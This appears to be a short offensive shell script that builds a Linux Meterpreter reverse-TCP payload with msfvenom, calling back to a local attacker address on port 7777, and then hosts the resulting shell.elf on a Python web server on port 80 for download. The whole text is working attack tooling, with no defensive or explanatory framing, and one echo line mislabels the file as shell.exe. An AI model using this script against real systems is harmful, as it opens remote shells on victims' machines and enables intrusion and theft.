msfvenom -p linux/meterpreter/reverse_tcp LHOST=192.168.119.129 LPORT=7777 -f elf -o shell.elf
echo '[*] Serving up shell.exe at http://192.168.119.129/shell.elf'
echo '[*] Ctrl + c to kill'
python -m SimpleHTTPServer 80
